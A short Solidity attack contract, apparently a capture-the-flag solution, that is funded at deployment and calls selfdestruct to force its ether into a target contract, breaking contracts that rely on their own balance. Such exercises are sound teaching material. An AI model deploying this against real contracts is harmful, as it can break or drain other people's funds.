// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RetirementAttacker {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function kill() public {
        selfdestruct(payable(target));
    }
}
